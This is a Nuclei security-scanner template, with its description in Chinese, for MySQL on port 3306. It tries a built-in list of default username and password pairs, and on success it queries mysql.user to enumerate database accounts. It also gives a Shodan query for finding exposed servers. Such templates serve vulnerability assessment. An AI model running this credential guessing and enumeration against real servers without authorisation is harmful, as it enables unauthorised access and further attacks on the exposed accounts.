id: mysql-user-enum

info:
  name: MySQL 用户枚举（服务漏洞）
  author: pussycat0x
  severity: high
  description: |
    MySQL 服务接受模板尝试的常见凭据后，允许已认证用户查询 mysql.user 并枚举账号信息，说明账号权限过宽或弱凭据可被利用。该模板使用内置用户名和密码组合连接数据库，并执行 SELECT DISTINCT user FROM mysql.user 以提取数据库用户列表。
  impact: |
    - 枚举到的 MySQL 用户可暴露账号命名规则、权限边界和潜在高权限目标。
    - 攻击者可将账号列表用于口令猜测、凭据填充或针对 DBA/应用账号的后续攻击。
  remediation: |
    - 移除弱凭据并限制普通账号读取用户表或账号清单的权限。
    - 定期清理无用账号、强制强口令，并监控异常用户枚举查询。
  reference:
    - https://nmap.org/nsedoc/scripts/mysql-users.html
  metadata:
    verified: true
    max-request: 16
    shodan-query: "port:3306"
    vendor: oracle
    product: mysql
  tags: js,mysql,network,enum,discovery

javascript:
  - pre-condition: |
      isPortOpen(Host,Port);
    code: |
      let m = require('nuclei/mysql');
      let c = m.MySQLClient();
      let response = c.ExecuteQuery(Host,Port,User,Pass,Query);
      Export(response);

    args:
      Host: "{{Host}}"
      Port: "3306"
      Query: "SELECT DISTINCT user FROM mysql.user;"
      User: "{{usernames}}"
      Pass: "{{passwords}}"

    payloads:
      usernames:
        - root
        - admin
        - mysql
        - test
      passwords:
        - root
        - admin
        - mysql
        - test
    attack: clusterbomb

    stop-at-first-match: true
    matchers:
      - type: dsl
        dsl:
          - "success == true"

    extractors:
      - type: json
        part: response
        json:
          - '.Rows[].user'
